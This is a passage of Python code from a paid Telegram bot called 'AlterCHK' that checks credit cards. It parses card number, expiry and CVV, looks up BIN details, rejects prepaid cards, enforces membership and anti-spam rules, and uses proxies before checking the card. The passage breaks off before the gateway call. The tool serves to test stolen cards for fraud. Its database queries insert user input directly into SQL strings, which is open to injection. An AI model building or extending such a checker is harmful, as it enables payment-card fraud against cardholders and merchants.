    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return